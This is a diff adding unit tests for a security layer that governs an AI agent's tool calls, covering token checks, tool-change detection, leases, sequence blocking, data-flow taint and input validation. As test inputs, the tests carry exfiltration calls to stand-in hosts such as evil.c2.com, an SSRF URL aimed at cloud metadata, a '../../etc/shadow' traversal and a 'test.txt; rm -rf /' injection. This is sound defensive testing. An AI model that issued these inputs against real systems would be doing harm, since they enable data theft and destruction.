@@ -455,3 +455,349 @@ describe("Authentication & RBAC Manager", () => {
   });
 });
 
+// ═══════════════════════════════════════════════════════
+// NEW SUBSYSTEM TESTS: Identity, Leases, Context, DataFlow,
+// Semantic Firewall, Input Validator, and Decision Receipts
+// ═══════════════════════════════════════════════════════
+
+describe("Subsystem: Identity Verifier", () => {
+  it("should generate and verify valid cryptographic bearer tokens", () => {
+    const controller = new AdaptiveController();
+    const verifier = controller.getIdentityVerifier();
+
+    const token = verifier.generateToken("alice", ["analyst"], ["tools:execute"], 3600, "agent-007");
+    const result = verifier.verifyToken(token);
+
+    expect(result.valid).toBe(true);
+    expect(result.claims?.userId).toBe("alice");
+    expect(result.claims?.roles).toContain("analyst");
+    expect(result.claims?.agentId).toBe("agent-007");
+  });
+
+  it("should reject tampered and expired tokens", () => {
+    const controller = new AdaptiveController();
+    const verifier = controller.getIdentityVerifier();
+
+    const token = verifier.generateToken("bob", ["analyst"], ["tools:execute"], -10); // expired
+    const result = verifier.verifyToken(token);
+    expect(result.valid).toBe(false);
+    expect(result.error).toContain("expired");
+
+    // Tampered token
+    const validToken = verifier.generateToken("bob", ["analyst"]);
+    const tampered = validToken.slice(0, -5) + "xxxxx";
+    expect(verifier.verifyToken(tampered).valid).toBe(false);
+  });
+
+  it("should never trust an unverified userRole supplied in raw request", () => {
+    const controller = new AdaptiveController();
+    const verifier = controller.getIdentityVerifier();
+
+    // Attacker claims admin role in request body without valid token
+    const enforced = verifier.enforceVerifiedRole(undefined, "admin", "attacker");
+    expect(enforced.verified).toBe(false);
+    expect(enforced.primaryRole).toBe("viewer"); // Demoted to lowest privilege
+  });
+});
+
+describe("Subsystem: Semantic Change Firewall", () => {
+  it("should detect capability expansion when tool description adds env access", () => {
+    const controller = new AdaptiveController();
+    const firewall = controller.getSemanticFirewall();
+
+    const previous = {
+      toolId: "tool-1",
+      toolName: "search_logs",
+      serverId: "srv-1",
+      description: "Read security logs from the system",
+      inputSchema: { type: "object", properties: { query: { type: "string" } } },
+      declaredCapabilities: createEmptyCapabilitySet(),
+      authorizedCapabilities: createEmptyCapabilitySet(),
+      baselineFingerprint: null,
+      currentFingerprint: null,
+      riskScore: 0,
+      criticality: "low" as const,
+      sensitivity: "internal" as const,
+      state: "ACTIVE" as const,
+      callCount: 1,
+      lastCalledAt: null,
+    };
+
+    const updated = {
+      description: "Read security logs and retrieve environment configuration variables",
+    };
+
+    const diff = firewall.evaluateUpdate(previous, updated);
+    expect(diff.hasSemanticChange).toBe(true);
+    expect(diff.requiresRevalidation).toBe(true);
+    expect(diff.findings.some(f => f.type === "CAPABILITY_EXPANSION")).toBe(true);
+    expect(diff.riskScoreIncrement).toBeGreaterThan(0);
+  });
+
+  it("should detect permission expansion when new parameters like 'command' are added", () => {
+    const controller = new AdaptiveController();
+    const firewall = controller.getSemanticFirewall();
+
+    const previous = {
+      toolId: "tool-2",
+      toolName: "ping_host",
+      serverId: "srv-1",
+      description: "Ping target host",
+      inputSchema: { type: "object", properties: { host: { type: "string" } } },
+      declaredCapabilities: createEmptyCapabilitySet(),
+      authorizedCapabilities: createEmptyCapabilitySet(),
+      baselineFingerprint: null,
+      currentFingerprint: null,
+      riskScore: 0,
+      criticality: "low" as const,
+      sensitivity: "public" as const,
+      state: "ACTIVE" as const,
+      callCount: 1,
+      lastCalledAt: null,
+    };
+
+    const updated = {
+      inputSchema: {
+        type: "object",
+        properties: {
+          host: { type: "string" },
+          cmd: { type: "string" }, // Sensitive new parameter
+        },
+      },
+    };
+
+    const diff = firewall.evaluateUpdate(previous, updated);
+    expect(diff.hasSemanticChange).toBe(true);
+    expect(diff.findings.some(f => f.type === "PERMISSION_EXPANSION")).toBe(true);
+  });
+});
+
+describe("Subsystem: Capability Lease Manager", () => {
+  it("should issue and validate workflow-scoped capability leases", () => {
+    const controller = new AdaptiveController();
+    const leaseMgr = controller.getLeaseManager();
+
+    const lease = leaseMgr.issueLease({
+      toolId: "tool-logs",
+      toolName: "search_logs",
+      capability: "READ",
+      scope: "soc-investigation",
+      workflowId: "wf-101",
+      userId: "analyst1",
+      ttlSeconds: 600,
+    });
+
+    expect(lease.leaseId).toBeDefined();
+    expect(lease.state).toBe("ACTIVE");
+
+    const check = leaseMgr.validateLease({
+      leaseId: lease.leaseId,
+      toolId: "tool-logs",
+      capability: "READ",
+      workflowId: "wf-101",
+    });
+    expect(check.valid).toBe(true);
+  });
+
+  it("should automatically revoke active leases on critical risk escalation", () => {
+    const controller = new AdaptiveController();
+    const leaseMgr = controller.getLeaseManager();
+
+    const lease = leaseMgr.issueLease({
+      toolId: "tool-logs",
+      toolName: "search_logs",
+      capability: "READ",
+      scope: "soc-investigation",
+      workflowId: "wf-102",
+      userId: "analyst1",
+      ttlSeconds: 600,
+    });
+
+    // Escalate risk to 78 (quarantine threshold >= 75)
+    const revokedCount = leaseMgr.onRiskEscalation("tool-logs", "wf-102", 78);
+    expect(revokedCount).toBeGreaterThan(0);
+
+    const check = leaseMgr.validateLease({
+      leaseId: lease.leaseId,
+      toolId: "tool-logs",
+      capability: "READ",
+      workflowId: "wf-102",
+    });
+    expect(check.valid).toBe(false);
+    expect(check.reason).toContain("revoked");
+  });
+});
+
+describe("Subsystem: Contextual Tool-Call Security Engine & Capability Transitions", () => {
+  it("should allow legitimate investigation workflow sequence (READ -> EXTERNAL_LOOKUP -> WRITE)", () => {
+    const controller = new AdaptiveController();
+    const contextual = controller.getContextualEngine();
+
+    const wfId = "wf-soc-legitimate";
+    const intent = "Investigate suspicious activity from 10.10.20.30";
+
+    // 1. search_logs (READ)
+    const res1 = contextual.evaluateToolCall({
+      workflowId: wfId,
+      userId: "analyst1",
+      intent,
+      server: "soc-tools",
+      tool: "search_logs",
+      toolId: "t-1",
+      args: { query: "10.10.20.30" },
+    });
+    expect(res1.action).toBe("allow");
+    contextual.recordCall(wfId, "t-1", "search_logs", "soc-tools", {}, "allow", 0);
+
+    // 2. lookup_ip (EXTERNAL_LOOKUP)
+    const res2 = contextual.evaluateToolCall({
+      workflowId: wfId,
+      userId: "analyst1",
+      intent,
+      server: "soc-tools",
+      tool: "lookup_ip",
+      toolId: "t-2",
+      args: { ip: "10.10.20.30" },
+    });
+    expect(res2.action).toBe("allow");
+    contextual.recordCall(wfId, "t-2", "lookup_ip", "soc-tools", {}, "allow", 0);
+
+    // 3. create_incident (WRITE)
+    const res3 = contextual.evaluateToolCall({
+      workflowId: wfId,
+      userId: "analyst1",
+      intent,
+      server: "soc-tools",
+      tool: "create_incident",
+      toolId: "t-3",
+      args: { title: "Brute force from 10.10.20.30" },
+    });
+    expect(res3.action).toBe("allow");
+  });
+
+  it("should BLOCK contextual attack sequence (READ -> EXTERNAL_LOOKUP -> SECRET_ACCESS -> DATA_TRANSFER)", () => {
+    const controller = new AdaptiveController();
+    const contextual = controller.getContextualEngine();
+
+    const wfId = "wf-soc-attack";
+    const intent = "Investigate suspicious activity from 10.10.20.30";
+
+    // Prior recon: search_logs + lookup_ip
+    contextual.recordCall(wfId, "t-1", "search_logs", "soc-tools", {}, "allow", 0);
+    contextual.recordCall(wfId, "t-2", "lookup_ip", "soc-tools", {}, "allow", 0);
+
+    // Tool 3: get_credentials (SECRET_ACCESS) in an investigation workflow
+    const res3 = contextual.evaluateToolCall({
+      workflowId: wfId,
+      userId: "analyst1",
+      intent,
+      server: "soc-tools",
+      tool: "get_credentials",
+      toolId: "t-cred",
+      args: { domain: "corp.internal" },
+    });
+    expect(res3.action).not.toBe("allow"); // Restrict or require approval
+    contextual.recordCall(wfId, "t-cred", "get_credentials", "soc-tools", {}, "allow", 35);
+
+    // Tool 4: send_data (DATA_TRANSFER) -> ATTACK SEQUENCE: Recon -> Secret -> Exfil
+    const res4 = contextual.evaluateToolCall({
+      workflowId: wfId,
+      userId: "analyst1",
+      intent,
+      server: "soc-tools",
+      tool: "send_data",
+      toolId: "t-send",
+      args: { dest: "https://evil.c2.com", payload: "secret" },
+    });
+
+    expect(res4.action).toBe("block");
+    expect(res4.isDangerousSequence).toBe(true);
+    expect(res4.reason).toContain("Dangerous sequence detected");
+  });
+});
+
+describe("Subsystem: Data-Flow Guard", () => {
+  it("should classify sensitive output and block data flow into external transfer tools", () => {
+    const controller = new AdaptiveController();
+    const dataFlow = controller.getDataFlowGuard();
+
+    const wfId = "wf-data-flow-test";
+
+    // 1. Tool outputs leaked credentials
+    const secretOutput = "Database connection token: sk-proj-supersecretkey999111";
+    dataFlow.recordTaint({
+      workflowId: wfId,
+      originTool: "get_credentials",
+      originResource: "auth-database",
+      outputText: secretOutput,
+    });
+
+    // 2. Next tool attempts to send data to external destination
+    const check = dataFlow.checkDataFlow({
+      workflowId: wfId,
+      toolName: "send_data",
+      capability: "DATA_TRANSFER",
+      args: { dest: "https://external-leak.com/exfil", content: "data" },
+    });
+
+    expect(check.allowed).toBe(false);
+    expect(check.violation?.sourceClassification).toBe("SECRET");
+    expect(check.violation?.reason).toContain("Data-Flow Violation");
+  });
+});
+
+describe("Subsystem: Input Validation Guard", () => {
+  it("should detect and block SSRF targeting cloud metadata and localhost", () => {
+    const controller = new AdaptiveController();
+    const inputValidator = controller.getInputValidator();
+
+    const ssrfArgs = { url: "http://169.254.169.254/latest/meta-data/" };
+    const res = inputValidator.validate("fetch_url", ssrfArgs);
+
+    expect(res.valid).toBe(false);
+    expect(res.violations.some(v => v.ruleId === "input-ssrf-blocked")).toBe(true);
+  });
+
+  it("should detect and block path traversal and command injection syntax", () => {
+    const controller = new AdaptiveController();
+    const inputValidator = controller.getInputValidator();
+
+    const traversalArgs = { path: "../../etc/shadow" };
+    expect(inputValidator.validate("read_file", traversalArgs).valid).toBe(false);
+
+    const injectionArgs = { filename: "test.txt; rm -rf /" };
+    expect(inputValidator.validate("compress_file", injectionArgs).valid).toBe(false);
+  });
+});
+
+describe("Subsystem: Decision Receipts Ledger", () => {
+  it("should generate verifiable, tamper-evident decision receipts with SHA-256 hash", () => {
+    const controller = new AdaptiveController();
+    const ledger = controller.getReceiptsLedger();
+
+    const receipt = ledger.recordReceiptSync({
+      workflowId: "wf-receipt-test",
+      tool: "send_data",
+      toolId: "tool-send",
+      server: "untrusted-vendor",
+      decision: "BLOCK",
+      riskScore: 82,
+      state: "RESTRICT",
+      reasons: ["Contextual exfiltration sequence detected"],
+      evidence: ["READ -> SECRET_ACCESS -> DATA_TRANSFER"],
+      previousTools: ["search_logs", "get_credentials"],
+      capabilityTransitions: [{ from: "SECRET_ACCESS", to: "DATA_TRANSFER" }],
+    });
+
+    expect(receipt.receiptId).toBeDefined();
+    expect(receipt.hash).toBeDefined();
+    expect(receipt.hash.length).toBe(64); // SHA-256 hex length
+    expect(receipt.decision).toBe("BLOCK");
+
+    const retrieved = ledger.getReceipt(receipt.receiptId);
+    expect(retrieved).toBeDefined();
+    expect(retrieved?.hash).toBe(receipt.hash);
+  });
+});
+
+
